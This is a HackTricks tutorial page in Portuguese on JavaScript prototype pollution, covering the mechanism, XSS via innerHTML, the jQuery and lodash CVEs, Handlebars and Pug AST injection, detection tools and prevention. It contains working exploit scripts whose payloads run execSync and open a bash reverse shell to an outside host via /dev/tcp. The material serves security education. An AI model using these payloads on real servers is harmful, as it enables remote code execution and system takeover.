# NodeJS - \_\_proto\_\_ & polui√ß√£o de prot√≥tipo

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}

## Objetos em JavaScript <a href="#id-053a" id="id-053a"></a>

Objetos em JavaScript s√£o essencialmente cole√ß√µes de pares chave-valor, conhecidos como propriedades. Um objeto pode ser criado usando `Object.create` com `null` como argumento para produzir um objeto vazio. Este m√©todo permite a cria√ß√£o de um objeto sem nenhuma propriedade herdada.
```javascript
// Run this in the developers tools console
console.log(Object.create(null)); // This will output an empty object.
```
Um objeto vazio √© semelhante a um dicion√°rio vazio, representado como `{}`.

### Fun√ß√µes e Classes em JavaScript

Em JavaScript, classes e fun√ß√µes est√£o intimamente ligadas, com fun√ß√µes frequentemente servindo como construtores para classes. Apesar da falta de suporte nativo a classes no JavaScript, construtores podem emular o comportamento de classes.
```javascript
// Run this in the developers tools console

function Employee(name, position) {
this.name = name;
this.position = position;
this.introduce = function() {
return "My name is " + this.name + " and I work as a " + this.position + ".";
}
}

Employee.prototype

var employee1 = new Employee("Generic Employee", "Developer");

employee1.__proto__
```
### Prototypes em JavaScript

JavaScript permite a modifica√ß√£o, adi√ß√£o ou exclus√£o de atributos de prot√≥tipo em tempo de execu√ß√£o. Essa flexibilidade possibilita a extens√£o din√¢mica das funcionalidades de classes.

Fun√ß√µes como `toString` e `valueOf` podem ser alteradas para mudar seu comportamento, demonstrando a natureza adapt√°vel do sistema de prot√≥tipos do JavaScript.

## Heran√ßa

Na programa√ß√£o baseada em prot√≥tipos, propriedades/m√©todos s√£o herdados por objetos de classes. Essas classes s√£o criadas adicionando propriedades/m√©todos a uma inst√¢ncia de outra classe ou a um objeto vazio.

Deve-se notar que, quando uma propriedade √© adicionada a um objeto que serve como prot√≥tipo para outros objetos (como `myPersonObj`), os objetos que herdam ganham acesso a essa nova propriedade. No entanto, essa propriedade n√£o √© exibida automaticamente, a menos que seja invocada explicitamente.

## \_\_proto\_\_ pollution <a href="#id-0d0a" id="id-0d0a"></a>

## Explorando a Polui√ß√£o de Prot√≥tipos em JavaScript

Objetos JavaScript s√£o definidos por pares de chave-valor e herdam do prot√≥tipo do Objeto JavaScript. Isso significa que alterar o prot√≥tipo do Objeto pode influenciar todos os objetos no ambiente.

Vamos usar um exemplo diferente para ilustrar:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
```
O acesso ao prot√≥tipo do Object √© poss√≠vel atrav√©s de:
```javascript
car1.__proto__.__proto__;
Vehicle.__proto__.__proto__;
```
Ao adicionar propriedades ao prot√≥tipo do Object, todo objeto JavaScript herdar√° essas novas propriedades:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding a method to the Object prototype
car1.__proto__.__proto__.announce = function() { console.log("Beep beep!"); };
car1.announce(); // Outputs "Beep beep!"
// Adding a property to the Object prototype
car1.__proto__.__proto__.isVehicle = true;
console.log(car1.isVehicle); // Outputs true
```
## polui√ß√£o de prot√≥tipo

Para um cen√°rio onde o uso de `__proto__` √© restrito, modificar o prot√≥tipo de uma fun√ß√£o √© uma alternativa:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding properties to the Vehicle prototype
Vehicle.prototype.beep = function() { console.log("Beep beep!"); };
car1.beep(); // Now works and outputs "Beep beep!"
Vehicle.prototype.hasWheels = true;
console.log(car1.hasWheels); // Outputs true

// Alternate method
car1.constructor.prototype.honk = function() { console.log("Honk!"); };
car1.constructor.prototype.isElectric = true;
```
Isso afeta apenas objetos criados a partir do construtor `Vehicle`, dando a eles as propriedades `beep`, `hasWheels`, `honk` e `isElectric`.

Duas maneiras de afetar globalmente objetos JavaScript atrav√©s da polui√ß√£o de prot√≥tipos incluem:

1. Poluir o `Object.prototype` diretamente:
```javascript
Object.prototype.goodbye = function() { console.log("Goodbye!"); };
```
2. Poluindo o prot√≥tipo de um construtor para uma estrutura comumente usada:
```javascript
var example = {"key": "value"};
example.constructor.prototype.greet = function() { console.log("Hello!"); };
```
Ap√≥s essas opera√ß√µes, cada objeto JavaScript pode executar os m√©todos `goodbye` e `greet`.

## Poluindo outros objetos

### De uma classe para Object.prototype

Em um cen√°rio onde voc√™ pode **poluir um objeto espec√≠fico** e precisa **chegar ao `Object.prototype`**, voc√™ pode procur√°-lo com algo como o seguinte c√≥digo:
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
```
### Polui√ß√£o de elementos de array

Note que, assim como voc√™ pode poluir atributos de objetos em JS, se voc√™ tiver acesso para poluir um array, voc√™ tamb√©m pode **poluir valores do array** acess√≠veis **por √≠ndices** (note que voc√™ n√£o pode sobrescrever valores, ent√£o voc√™ precisa poluir √≠ndices que s√£o de alguma forma utilizados, mas n√£o escritos).
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### Polui√ß√£o de elementos Html

Ao gerar um elemento HTML via JS, √© poss√≠vel **sobrescrever** o atributo **`innerHTML`** para fazer com que ele escreva **c√≥digo HTML arbitr√°rio.** [Ideia e exemplo deste artigo](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/).

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## Exemplos

### Exemplo B√°sico

Uma polui√ß√£o de prot√≥tipo ocorre devido a uma falha na aplica√ß√£o que permite sobrescrever propriedades em `Object.prototype`. Isso significa que, uma vez que a maioria dos objetos deriva suas propriedades de `Object.prototype`

O exemplo mais simples √© adicionar um valor a um **atributo indefinido de um objeto** que ser√° verificado, como:
```javascript
if (user.admin) {
```
Se o atributo **`admin` est√° indefinido**, √© poss√≠vel abusar de um PP e defini-lo como True com algo como:
```javascript
Object.prototype.isAdmin = true
let user = {}
user.isAdmin // true
```
O mecanismo por tr√°s disso envolve manipular propriedades de forma que, se um atacante tiver controle sobre certas entradas, ele pode modificar o prot√≥tipo de todos os objetos na aplica√ß√£o. Essa manipula√ß√£o geralmente envolve definir a propriedade `__proto__`, que, em JavaScript, √© sin√¥nimo de modificar diretamente o prot√≥tipo de um objeto.

As condi√ß√µes sob as quais esse ataque pode ser executado com sucesso, conforme descrito em um [estudo](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript\_prototype\_pollution\_attack\_in\_NodeJS.pdf) espec√≠fico, incluem:

* Realizar uma mesclagem recursiva.
* Definir propriedades com base em um caminho.
* Clonar objetos.

### Fun√ß√£o de substitui√ß√£o
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Polui√ß√£o de Proto para RCE

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

Outros payloads:

* [https://github.com/KTH-LangSec/server-side-prototype-pollution](https://github.com/KTH-LangSec/server-side-prototype-pollution)

## Polui√ß√£o de prot√≥tipo do lado do cliente para XSS

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019‚Äì11358: Ataque de polui√ß√£o de prot√≥tipo atrav√©s do jQuery $ .extend

[Para mais detalhes, consulte este artigo](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7) No jQuery, a fun√ß√£o `$ .extend` pode levar √† polui√ß√£o de prot√≥tipo se o recurso de c√≥pia profunda for utilizado de forma inadequada. Esta fun√ß√£o √© comumente usada para clonar objetos ou mesclar propriedades de um objeto padr√£o. No entanto, quando mal configurada, propriedades destinadas a um novo objeto podem ser atribu√≠das ao prot√≥tipo em vez disso. Por exemplo:
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'));
console.log({}.devMode); // Outputs: true
```
Esta vulnerabilidade, identificada como CVE-2019‚Äì11358, ilustra como uma c√≥pia profunda pode inadvertidamente modificar o prot√≥tipo, levando a potenciais riscos de seguran√ßa, como acesso n√£o autorizado de administrador se propriedades como `isAdmin` forem verificadas sem a devida verifica√ß√£o de exist√™ncia.

### CVE-2018‚Äì3721, CVE-2019‚Äì10744: Ataque de polui√ß√£o de prot√≥tipo atrav√©s do lodash

[Para mais detalhes, consulte este artigo](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)

[Lodash](https://www.npmjs.com/package/lodash) encontrou vulnerabilidades semelhantes de polui√ß√£o de prot√≥tipo (CVE-2018‚Äì3721, CVE-2019‚Äì10744). Esses problemas foram resolvidos na vers√£o 4.17.11.

### Outro tutorial com CVEs

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

### Ferramentas para detectar Polui√ß√£o de Prot√≥tipo

* [**Server-Side-Prototype-Pollution-Gadgets-Scanner**](https://github.com/doyensec/Server-Side-Prototype-Pollution-Gadgets-Scanner): Extens√£o do Burp Suite projetada para detectar e analisar vulnerabilidades de polui√ß√£o de prot√≥tipo do lado do servidor em aplica√ß√µes web. Esta ferramenta automatiza o processo de escaneamento de requisi√ß√µes para identificar potenciais problemas de polui√ß√£o de prot√≥tipo. Ela explora gadgets conhecidos - m√©todos de aproveitar a polui√ß√£o de prot√≥tipo para executar a√ß√µes prejudiciais - focando particularmente em bibliotecas Node.js.
* [**server-side-prototype-pollution**](https://github.com/portswigger/server-side-prototype-pollution): Esta extens√£o identifica vulnerabilidades de polui√ß√£o de prot√≥tipo do lado do servidor. Ela utiliza t√©cnicas descritas na [polui√ß√£o de prot√≥tipo do lado do servidor](https://portswigger.net/research/server-side-prototype-pollution).

### Polui√ß√£o de Prot√≥tipo AST no NodeJS

NodeJS utiliza extensivamente √Årvores de Sintaxe Abstrata (AST) em JavaScript para funcionalidades como motores de template e TypeScript. Esta se√ß√£o explora as vulnerabilidades relacionadas √† polui√ß√£o de prot√≥tipo em motores de template, especificamente Handlebars e Pug.

#### An√°lise de Vulnerabilidade do Handlebars

O motor de template Handlebars √© suscet√≠vel a um ataque de polui√ß√£o de prot√≥tipo. Esta vulnerabilidade surge de fun√ß√µes espec√≠ficas dentro do arquivo `javascript-compiler.js`. A fun√ß√£o `appendContent`, por exemplo, concatena `pendingContent` se estiver presente, enquanto a fun√ß√£o `pushSource` redefine `pendingContent` para `undefined` ap√≥s adicionar a fonte.

**Processo de Explora√ß√£o**

A explora√ß√£o aproveita o AST (√Årvore de Sintaxe Abstrata) produzido pelo Handlebars, seguindo estas etapas:

1. **Manipula√ß√£o do Parser**: Inicialmente, o parser, atrav√©s do n√≥ `NumberLiteral`, imp√µe que os valores sejam num√©ricos. A polui√ß√£o de prot√≥tipo pode contornar isso, permitindo a inser√ß√£o de strings n√£o num√©ricas.
2. **Tratamento pelo Compilador**: O compilador pode processar um Objeto AST ou um template de string. Se `input.type` for igual a `Program`, a entrada √© tratada como pr√©-analisada, o que pode ser explorado.
3. **Inje√ß√£o de C√≥digo**: Atrav√©s da manipula√ß√£o de `Object.prototype`, pode-se injetar c√≥digo arbitr√°rio na fun√ß√£o de template, o que pode levar √† execu√ß√£o remota de c√≥digo.

Um exemplo demonstrando a explora√ß√£o da vulnerabilidade do Handlebars:
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];

const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());
```
Este c√≥digo demonstra como um atacante poderia injetar c√≥digo arbitr√°rio em um template Handlebars.

**Refer√™ncia Externa**: Um problema relacionado √† polui√ß√£o de prot√≥tipos foi encontrado na biblioteca 'flat', conforme detalhado aqui: [Problema no GitHub](https://github.com/hughsk/flat/issues/105).

**Refer√™ncia Externa**: [Problema relacionado √† polui√ß√£o de prot√≥tipos na biblioteca 'flat'](https://github.com/hughsk/flat/issues/105)

Exemplo de explora√ß√£o de polui√ß√£o de prot√≥tipos em Python:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
```
#### Vulnerabilidade do Pug

Pug, outro mecanismo de template, enfrenta um risco semelhante de polui√ß√£o de prot√≥tipo. Informa√ß√µes detalhadas est√£o dispon√≠veis na discuss√£o sobre [Inje√ß√£o de AST no Pug](https://blog.p6.is/AST-Injection/#Pug).

Exemplo de polui√ß√£o de prot√≥tipo no Pug:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
})

# execute
requests.get(TARGET_URL)
```
### Medidas Preventivas

Para reduzir o risco de polui√ß√£o de prot√≥tipos, as estrat√©gias listadas abaixo podem ser empregadas:

1. **Imutabilidade de Objetos**: O `Object.prototype` pode ser tornado imut√°vel aplicando `Object.freeze`.
2. **Valida√ß√£o de Entrada**: As entradas JSON devem ser rigorosamente validadas em rela√ß√£o ao esquema da aplica√ß√£o.
3. **Fun√ß√µes de Mesclagem Seguras**: O uso inseguro de fun√ß√µes de mesclagem recursivas deve ser evitado.
4. **Objetos Sem Prot√≥tipo**: Objetos sem propriedades de prot√≥tipo podem ser criados usando `Object.create(null)`.
5. **Uso de Map**: Em vez de `Object`, `Map` deve ser usado para armazenar pares chave-valor.
6. **Atualiza√ß√µes de Biblioteca**: Corre√ß√µes de seguran√ßa podem ser incorporadas atualizando bibliotecas regularmente.
7. **Ferramentas de Linter e An√°lise Est√°tica**: Use ferramentas como ESLint com plugins apropriados para detectar e prevenir vulnerabilidades de polui√ß√£o de prot√≥tipos.
8. **Revis√µes de C√≥digo**: Implemente revis√µes de c√≥digo minuciosas para identificar e remediar riscos potenciais relacionados √† polui√ß√£o de prot√≥tipos.
9. **Treinamento em Seguran√ßa**: Eduque os desenvolvedores sobre os riscos da polui√ß√£o de prot√≥tipos e as melhores pr√°ticas para escrever c√≥digo seguro.
10. **Uso Cauteloso de Bibliotecas**: Tenha cautela ao usar bibliotecas de terceiros. Avalie sua postura de seguran√ßa e revise seu c√≥digo, especialmente aquelas que manipulam objetos.
11. **Prote√ß√£o em Tempo de Execu√ß√£o**: Empregue mecanismos de prote√ß√£o em tempo de execu√ß√£o, como o uso de pacotes npm focados em seguran√ßa que podem detectar e prevenir ataques de polui√ß√£o de prot√≥tipos.

## Refer√™ncias

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)
* [https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
